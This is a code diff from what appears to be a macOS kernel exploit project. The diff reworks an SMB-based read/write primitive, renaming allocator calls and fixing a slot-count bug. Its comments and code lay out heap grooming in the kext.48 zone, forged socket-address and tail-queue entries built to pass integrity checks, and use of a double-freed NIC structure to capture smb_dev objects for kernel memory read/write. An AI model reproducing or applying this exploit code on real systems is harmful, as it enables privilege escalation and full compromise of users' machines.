@@ -23,7 +23,7 @@
 
 #include "memory/allocator_rw.h"
 #include "memory/allocator_nrnw.h"
-#include "memory/zkext_alloc_small.h"
+#include "memory/kheap_alloc.h"
 #include "memory/zkext_free.h"
 #include "smb/client.h"
 #include "smb/params.h"
@@ -183,13 +183,13 @@ struct smb_dev_rw {
 ///   TAILQ_ENTRY(sock_addr_entry) next;
 /// };
 ///
-/// The fake sock_addr_entry is allocated using `kmem_zkext_alloc_small` which allocates provided
+/// The fake sock_addr_entry is allocated using `xe_kheap_alloc` which allocates provided
 /// data as a socket address. This means that the first byte in allocated data will always be the
 /// size of allocation. Since we want to acheive read write on smb_dev which is allocated on kext.48
 /// zone, we want the fake sock_addr_entry and fake socket_address to be allocated on kext.48 zone.
-struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
+struct xe_kheap_alloc_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
     for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
-        struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 48, AF_INET, NULL, 0);
+        struct xe_kheap_alloc_entry entry = xe_kheap_alloc(smb_addr, 48, AF_INET, NULL, 0, 8);
         uintptr_t addr = entry.address;
         uint8_t sa_len = (uint8_t)addr;
         uint8_t sa_family = (uint8_t)(addr >> 8);
@@ -205,7 +205,7 @@ struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr(const struct sock
 }
 
 
-struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr_entry(const struct sockaddr_in* smb_addr, uintptr_t sock_addr, uintptr_t tqe_prev) {
+struct xe_kheap_alloc_entry smb_dev_rw_alloc_sock_addr_entry(const struct sockaddr_in* smb_addr, uintptr_t sock_addr, uintptr_t tqe_prev) {
     uint8_t sa_len = (uint8_t)sock_addr;
     xe_assert(sa_len == 48);
     uint8_t sa_family = (uint8_t)(sock_addr >> 8);
@@ -217,7 +217,7 @@ struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr_entry(const struc
     entry.next.tqe_prev = (struct sock_addr_entry**)tqe_prev;
     
     for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
-        struct kmem_zkext_alloc_small_entry alloc = kmem_zkext_alloc_small(smb_addr, sa_len, sa_family, (char*)&entry + 2, sizeof(entry) - 2);
+        struct xe_kheap_alloc_entry alloc = xe_kheap_alloc(smb_addr, sa_len, sa_family, (char*)&entry + 2, sizeof(entry) - 2, 2);
         uintptr_t allocated_address = alloc.address;
         if (allocated_address % 32 == 0) {
             kmem_allocator_prpw_destroy(&alloc.element_allocator);
@@ -332,7 +332,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     
     /// STEP 1: Allocate a socket address in kext.48 zone with the address of the allocated
     /// socket address ending with 48
-    struct kmem_zkext_alloc_small_entry fake_sockaddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
+    struct xe_kheap_alloc_entry fake_sockaddr_alloc = smb_dev_rw_alloc_sock_addr(smb_addr, nrnw_allocator);
     uintptr_t fake_sockaddr = fake_sockaddr_alloc.address;
     xe_log_debug("allocated socket_address at %p", (void*)fake_sockaddr);
     
@@ -350,7 +350,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
     /// `entry->next.tqe_prev = dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first)`.
     /// This allocated fake `sock_addr_entry` must be a valid tailq entry (`TAILQ_CHECK_NEXT` and
     /// `TAILQ_CHECK_PREV` must not panic)
-    struct kmem_zkext_alloc_small_entry fake_sock_addr_entry_alloc = smb_dev_rw_alloc_sock_addr_entry(smb_addr, fake_sockaddr, dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first));
+    struct xe_kheap_alloc_entry fake_sock_addr_entry_alloc = smb_dev_rw_alloc_sock_addr_entry(smb_addr, fake_sockaddr, dbf_nic_addr + offsetof(struct complete_nic_info_entry, addr_list.tqh_first));
     uintptr_t fake_sock_addr_entry = fake_sock_addr_entry_alloc.address;
     xe_log_debug("allocated sock_addr_entry at %p", (void*)fake_sock_addr_entry);
     
@@ -413,7 +413,7 @@ void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[
         xe_log_warn("failed to capture fake_sockaddr using rw allocator");
     }
     
-    int num_slots = (sock_addr_entry_found_index >= 0) + (sock_addr_entry_found_index >= 0);
+    int num_slots = (sock_addr_entry_found_index >= 0) + (sockaddr_found_index >= 0);
     xe_log_debug("got %d slots in kext.48 which could be used to capture smb_dev", num_slots);
     
     int* capture_smb_devs = alloca(sizeof(int) * NUM_SMB_DEV_CAPTURE_ALLOCS);
